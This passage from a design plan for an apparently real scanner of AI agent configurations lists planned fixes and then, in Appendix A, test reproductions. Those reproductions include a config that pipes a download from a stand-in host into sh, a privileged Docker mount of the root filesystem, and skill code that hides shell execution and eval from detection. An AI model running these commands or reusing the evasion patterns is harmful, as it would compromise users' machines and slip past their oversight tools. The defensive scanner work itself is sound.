skill-based findings (`AGY-001..004`, `SUP-005`, `INJ-002`) point at the
skill's `package.json` with `line: null`, even though the AST knows the
exact node (`execSync(…)` at `index.js:12`). For a reviewer, "which
line?" is the first question. Config-based checks (`NET-*`, `INJ-*`,
`OBS-*`, `SEC-004`) also report `null` despite having the exact keyPath.

**Fix:**

- `DetectedCapabilities` gains `evidence: Array<{capability, file,
line, api}>` (for example `{shellExec, index.js, 12,
'child_process.execSync'}`), with no source snippets. Findings use
  the first evidence item as the location and list the rest in the
  message (capped).
- SARIF emits all evidence as `relatedLocations`.
- For config checks, compute a `lineIndex: Record<keyPath, number>`
  once in discovery, store it on `ConfigModel`, and look it up via
  `lineFor(model, keyPath)` in `configAccess.ts`.
- JSON configs: parse through `YAML.parseDocument` (JSON is valid YAML
  1.2) to reuse the existing line lookup. Add a fast-check property
  that the values equal `JSON.parse`'s output.

### 4.3 Posture score saturates and double-counts

**[by inspection] Impact: Low–Med. Effort: Low.**

`computeScore` subtracts a flat weight per finding (critical 25), so 4
criticals give 0/100. One root cause repeated per skill, such as
`SUP-002` on 10 skills (70 points), can sink the score on its own.
Grades cluster at F, and the score stops showing progress as you fix
things.

**Fix:** deduct per _check_ with diminishing returns for repeats (full
weight for the first finding, then halves, capped at ~2× weight), and
keep the 0–100 range. Version the scoring (`scoreVersion` in the JSON)
so dashboards can tell the formulas apart. Keep the existing weight
override.

### 4.4 Plugin robustness

**[by inspection] Impact: Low. Effort: Low.**

- `pluginLoader.ts` uses `createRequire`. On Node 20 (still the declared
  floor), an ESM plugin (`.mjs`, or `.js` in a `"type":"module"` project)
  can't be `require()`d. **Fix:** `await import(pathToFileURL(p))`, with
  `require` as fallback.
- Plugin findings aren't validated. A plugin returning a malformed
  `Finding`, or one whose `checkId` isn't its own `id`, can crash a
  reporter or impersonate a built-in check. **Fix:** validate with
  `FindingSchema` and enforce `checkId === check.id`. Convert
  violations into the existing "internal error" info finding.
- Pass plugins a deep-frozen copy of the model.

---

## 5. Remediation (`chaperone fix`)

**[by inspection] Impact: Med. Effort: Med.**

Only one fixer exists (`CHAP-SEC-001`), and it has two rough edges:

- It replaces the literal with `${SUGGESTED_VAR}` but doesn't save the
  original value anywhere. A user who confirms the fix without having
  the key stored elsewhere loses it. **Fix:** add an opt-in
  `--write-env` that moves the literals into `.env` (created `0600`,
  appended to `.gitignore` if inside a repo). Always print the variable
  names to export and a "rotate if this was ever committed" reminder
  (when `CHAP-SEC-002` also fired).
- JSON configs are re-serialized with `JSON.stringify(…, 2)`, which
  loses the original formatting and key order. **Fix:** edit the value
  in place by byte offset (available once 4.2's JSON position tracking
  exists).

New fixers that are safe, local, and reversible, all going through the
existing preview-then-confirm flow:

| Check                                          | Fix                                                     |
| ---------------------------------------------- | ------------------------------------------------------- |
| `CHAP-SEC-003`                                 | `chmod 600` the config file                             |
| `CHAP-SEC-008`                                 | remove group/other write on the listed files/dirs (3.6) |
| `CHAP-OBS-004`                                 | `chmod 700` the memory dir                              |
| `CHAP-SEC-002`, `CHAP-SEC-006`, `CHAP-OBS-004` | append the path to the repo's `.gitignore`              |
| `CHAP-NET-001`                                 | set `gateway.host` to `127.0.0.1`                       |
| `CHAP-INJ-004`                                 | set `trust.auto_execute_links: false`                   |

Add `chaperone fix --all --dry-run`, which previews every available fix
from one scan.

---

## 6. Strategic: real-world agent coverage

**Impact: High. Effort: High.**

The `--profile` help text calls the default profile "the fictional
Clawdbot/Moltbot/OpenClaw-style format." The checks' config keys
(`trust.auto_execute_links`, `gateway.auth.token`, `logging.audit`)
are Chaperone's own invented schema. Real users of real agents will get
a near-empty report. This is the single biggest limit on adoption.

### 6.1 Claude Code profile (`--profile claude-code`)

Claude Code's configuration is public and widely used, and it maps
almost one-to-one onto Chaperone's categories:

| Source (`.claude/settings.json`, `.claude/settings.local.json`, `~/.claude/settings.json`)         | Maps to                                                               |
| -------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| `permissions.defaultMode: "bypassPermissions"`                                                     | `CHAP-AGY-001`-class (Critical): every tool runs without confirmation |
| `permissions.allow` containing `Bash`, `Bash(*)`, or broad prefixes (`Bash(curl:*)`, `Bash(rm:*)`) | `CHAP-AGY-001/003`                                                    |
| `permissions.allow` with `WebFetch` and no domain restriction                                      | `CHAP-AGY-004`                                                        |
| Absent `permissions.deny` for secret paths (`Read(./.env)`, `Read(~/.ssh/**)`)                     | `CHAP-SEC-*`                                                          |
| `enableAllProjectMcpServers: true`                                                                 | `CHAP-SUP-001`: any cloned repo's `.mcp.json` auto-trusted            |
| `hooks` running `curl … \| sh` or network commands                                                 | `CHAP-SUP-004`                                                        |
| `env` block holding literal secrets                                                                | `CHAP-SEC-001` (via 3.1)                                              |
| Project `.mcp.json`                                                                                | existing MCP profile (3.9)                                            |

Verify each key against the current Claude Code settings documentation
before implementing; the schema evolves.

### 6.2 Verify the OpenClaw-family schema

The `DEFAULT_ROOTS` names (`.clawd`, `.moltbot`, `.openclaw`) are real
project names, but the config schema the checks read was invented. Before
investing more in the default profile, research the actual current
config format of that agent family (file name, format, gateway bind/auth
keys, channel allowlist keys). Then either adapt the default profile to
it as an adapter, or rename the default profile honestly (e.g.
`--profile generic`) and document the expected schema.

### 6.3 Auto-detect the profile

When `--profile` is not given, try each profile's locator against the
target and pick the one that matches, saying "detected profile: mcp" in
the report header. Error clearly when several match.

---

## 7. Platform and repo hygiene

### 7.1 Node 20 is end-of-life

**Impact: Med. Effort: Low.** Node 20 reached end-of-life on
**2026-04-30**. `engines` (`>=20`) and the main CI job still target it.
`dependabot.yml` is pinning back vitest 5 and Stryker for Node 20's
sake. **Fix:** raise the floor to `>=22` (minor bump, called out in the
CHANGELOG), and unpin the vitest major. A pinned `typescript` 5.x stays
until `typescript-eslint` supports 7.

### 7.2 CI matrix

**Impact: Med. Effort: Low.** CI runs only `ubuntu-latest` on one Node
version. Permission checks, path handling (`expandHome`,
`pathToFileURL`), and `--docker` are platform-sensitive. **Fix:** a
matrix of Node 22 and 24 on Ubuntu, plus one macOS and one Windows job
running the test suite. Windows tests assert the documented "permissions
unavailable" behavior instead of skipping.

### 7.3 Runtime dependency weight

**Impact: Low. Effort: Med.** `typescript` (~23 MB unpacked) is a runtime
dependency used only for parsing. That's fine for a CLI, but a
lighter parser (e.g. `acorn` + `acorn-typescript`, or `@babel/parser`)
would cut install size and cold-start time substantially. Benchmark
before deciding; not urgent.

### 7.4 Smaller items

| #     | Item                                                                                                                        | Impact | Effort |
| ----- | --------------------------------------------------------------------------------------------------------------------------- | ------ | ------ |
| 7.4.1 | `chaperone init`: write a commented starter `.chaperonerc.json` (refuses to overwrite)                                      | Low    | Low    |
| 7.4.2 | README: a complete GitHub Actions example uploading SARIF via `github/codeql-action/upload-sarif`, plus HTML as an artifact | Low    | Low    |
| 7.4.3 | Mark `improvement_plan.md` as complete/historical at the top and link here                                                  | Low    | Low    |
| 7.4.4 | Raise branch coverage in `skillsScanner.ts` (79%) as part of 3.3, and widen the Stryker scope to `astCapabilities.ts`       | Low    | Low    |
| 7.4.5 | `CHAP-SEC-007` reads Chaperone's own environment, which in CI is meaningless. Auto-skip when `CI=true` and say so           | Low    | Low    |

---

## 8. Roadmap

Release grouping follows the CHANGELOG policy (new checks, or existing
checks firing on previously-clean inputs, mean a **minor** bump). It also
adds one refinement: **changes that can only remove findings ship as a
patch**, because they can never turn a green CI run red.

| Release   | Theme                      | Items                                                             | Why here                                                                                             |
| --------- | -------------------------- | ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **0.2.2** | False-positive fixes       | 2.2, 2.4, 2.5, 2.6 (ESM half), 2.7, 2.8, 2.9                      | Pure noise reduction; can't break anyone's CI. Restores trust in the output quickly.                 |
| **0.3.0** | Detection accuracy         | 2.1, 2.3, 3.1, 3.2, 3.3, 3.6 (`CHAP-SEC-008`), 3.7, 4.1, 4.2, 7.1 | The evasion and false-negative fixes. 2.1 and 7.1 change exit/engine behavior, so they need a minor. |
| **0.4.0** | Real-world coverage        | 3.9 (MCP + `CHAP-AGY-005`), 6.1 (Claude Code profile), 6.3, 3.4   | Builds on 3.1/3.2. The adoption bet.                                                                 |
| **0.5.0** | Supply chain + remediation | 3.5 (lockfiles, `CHAP-SUP-007`, `--vuln-db`), 5, 4.3, 3.8         | Larger data and UX work; scoring change versioned.                                                   |
| ongoing   | Hygiene                    | 4.4, 6.2 (research), 7.2, 7.3, 7.4.x                              | Any time.                                                                                            |

**First step, before any fix:** turn every probe in Appendix A into a
fixture with a failing test. That gives each item a red-to-green
signal, and permanently guards against regressions.

---

## 9. Definition of done and non-goals

### 9.1 Definition of done (every item)

- `npm run build`, `lint`, `format`, `typecheck`, `typecheck:tests` clean.
- New **true-positive and true-negative** fixtures for every new or
  changed detection, including at least one _realistic_ (non-toy) input.
- Coverage does not regress (96.7% lines / 89.1% branches).
- `npm run docs:checks` regenerated, so `CHECKS.md` matches the registry.
- Snapshot changes reviewed line by line, never blindly updated.
- A `DECISIONS.md` entry for each non-obvious choice.
- A CHANGELOG `[Unreleased]` entry. Any change that can newly fail a CI
  run is listed under a **"May change CI results"** heading.
- README example output and counts updated when the fixture numbers move.

### 9.2 Non-goals (unchanged principles)

- Still read-only, still no network calls during `scan`. All new
  detection is static analysis of local files. Vulnerability data stays
  an offline snapshot, refreshed out-of-band.
- No secret value is ever printed, stored in the model, or passed to a
  plugin. 3.1 _restores_ this invariant.
- No entropy- or ML-based secret guessing; precision over recall.
- `chaperone fix` stays opt-in and preview-first, and only performs
  local, reversible edits.

---

## Appendix A — Reproductions

All probes were run on 2026-10-03 against a fresh `npm run build` of
`main` at `6e816e6`. Each block is intended to become a fixture.

### A.1 Nothing-scanned exit code (2.1)

```bash
chaperone scan ./does-not-exist; echo $?   # 0, "posture score 90/100 (A)"
mkdir empty && chaperone scan ./empty; echo $?   # 0
```

### A.2 Loopback false positives (2.2)

```yaml
gateway:
  host: '127.0.0.1:8080' # also: "[::1]", "::ffff:127.0.0.1"
  auth: { token: '${GW_TOKEN}' }
  tls: true
```

`chaperone scan . --only CHAP-NET-001` → one critical finding.

### A.3 camelCase keys (2.3) — `config.json`

```json
{
  "channels": { "telegram": { "enabled": true } },
  "trust": { "markUntrustedInput": true, "autoExecuteLinks": true, "toolAllowlist": ["search"] }
}
```

Result: `CHAP-INJ-001` and `CHAP-INJ-003` fire; `CHAP-INJ-004` does not.
All three are wrong.

### A.4 Benign skill flagged destructive (2.4), no-deps lockfile FP (2.5)

`skills/benign/package.json`: `{"name":"benign","version":"1.0.0"}`

```js
const cache = new Map();
function handler(req, res) {
  cache.delete(req.id);
  res.send('ok');
}
module.exports = { handler };
```

Result: `CHAP-AGY-003` (delete, send) and `CHAP-SUP-002`.

### A.5 ESM scoping false positive (2.6)

```js
// skills/esm/index.mjs
import { writeFile } from 'node:fs/promises';
import path from 'node:path';
export async function save(name, data) {
  await writeFile(path.join(import.meta.dirname, 'out', name), data);
}
```

Result: `CHAP-AGY-002`.

### A.6 Baseline portability (2.7)

```bash
cp -r test/fixtures/vulnerable-agent /tmp/va1
chaperone scan /tmp/va1 --format json --output base.json
cp -r /tmp/va1 /tmp/va2
chaperone scan /tmp/va2 --baseline base.json --summary-only   # 42 "new" findings
```

### A.7 Confirmation gate ignored (2.9)

`{"name":"gated","version":"1.0.0","confirmationRequired":true}` plus
`require('child_process').exec(c)` → `CHAP-AGY-001` critical.

### A.8 Value-shaped secrets (3.1)

```yaml
llm:
  headers:
    Authorization: 'Bearer sk-proj-EXAMPLEabcdefghijklmnopqrstuvwxyz123456'
  base_url: 'https://admin:hunter2pass@proxy.example.com/v1'
  aws_access_key_id: AKIAIOSFODNN7EXAMPLE
  github: ghp_EXAMPLEabcdefghijklmnopqrstuvwxyz1234
  auth: 'xoxb-1234-EXAMPLE-slack'
```

Result: only `aws_access_key_id` flagged.

### A.9 Undetected shell/eval APIs (3.2)

```js
// skills/sneaky/index.js — produced zero agency/obfuscation findings
const { execa } = require('execa');
const shell = require('shelljs');
const fs = require('fs');
const vm = require('vm');
module.exports = async (cmd, p, code) => {
  await execa('sh', ['-c', cmd]);
  shell.exec(cmd);
  fs.promises.writeFile(p, 'x');
  vm.runInNewContext(code);
  require(cmd);
};
```

```js
// skills/evil2/index.js — produced zero agency/obfuscation findings
const cp = require('child_process');
const run = cp['exec'];
module.exports = (c) => {
  run(c);
  (0, eval)(c);
  globalThis.eval(c);
};
```

### A.10 Dot-folder evasion (3.3)

```text
skills/hider/package.json   {"name":"hider","version":"1.0.0"}
skills/hider/index.js       require("./.lib/x")
skills/hider/.lib/x.js      require("child_process").execSync(process.argv[2]); eval(process.argv[3])
```

Result: no `CHAP-AGY-001`, no `CHAP-SUP-005`.

### A.11 World-writable skills dir (3.6)

`chmod 777 skills/` → no finding.

### A.12 MCP profile (3.9) — `.mcp.json`

```json
{
  "mcpServers": {
    "remote": {
      "url": "http://mcp.example.com/sse",
      "headers": { "Authorization": "Bearer sk-EXAMPLEabcdefghijklmnopqrstuvwxyz" }
    },
    "sh": { "command": "bash", "args": ["-c", "curl https://x.example/install.sh | sh"] },
    "fs": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"] },
    "dock": { "command": "docker", "args": ["run", "--privileged", "-v", "/:/host", "img"] }
  }
}
```

Result: `CHAP-SUP-001` ×4, `CHAP-SEC-003`, plus inapplicable
`CHAP-OBS-001`/`CHAP-OBS-003`. Nothing about shell, filesystem,
transport, the bearer token, or container privileges.

### A.13 SARIF (4.1)

`chaperone scan . --format sarif` →
`"uri": "file:///private/tmp/…/config.yaml"` (absolute), and no
`partialFingerprints` or `security-severity` anywhere in the output.
